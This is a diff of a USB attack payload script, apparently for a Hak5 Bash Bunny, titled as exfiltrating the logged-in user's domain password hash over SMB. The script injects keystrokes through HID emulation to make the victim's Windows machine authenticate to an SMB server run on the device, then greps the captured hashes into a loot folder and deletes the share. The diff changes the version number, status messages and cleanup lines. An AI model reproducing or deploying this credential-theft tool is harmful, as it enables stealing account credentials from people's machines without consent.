@@ -2,15 +2,15 @@
 # Description:   Exfiltrates current logged in user's password hash (provided it is a domain account) by utalizing default behavior of SMB
 # Author:        Combat_Wombat
 # Props:         Hak5Darren (Who wrote the duck script this was based off of)
-# Version:       .35
+# Version:       1.0
 # Category:      Infiltration
 # Target:        Windows XP SP3+ UNTESTED
 # Attackmodes:   HID, RNDIS_Ethernet
 #REQUIRED: impacket
 
-#FAIL.............MISSING REQUIREMENT impacket
+#FAIL.............Missing Requirement Impacket
 #SETUP............Setup
-#STAGE1...........SETTING UP SMB SERVER
+#STAGE1...........Setting up SMB server
 #STAGE2...........HID Injection
 #CLEANUP..........Grepping for hash, storing in loot
 #FINISH...........Light is green trap is clean.
@@ -36,6 +36,7 @@ Q DELAY 400
 
 ######## HID STAGE 2########
 LED STAGE2
+
 #HID Injection begins by directing the client to the host
 Q GUI r
 Q DELAY 100
@@ -50,8 +51,7 @@ LED CLEANUP
 #mount -o sync /dev/nandf /root/udisk
 mkdir -p $LOOTDIR
 grep -a :: $SHAREDIR/$DATE.txt >> $LOOTDIR/$DATE.txt
-#disown
-#rm $SHAREDIR/$DATE.txt
+disown
 rm -rf $SHAREDIR
 sync
 
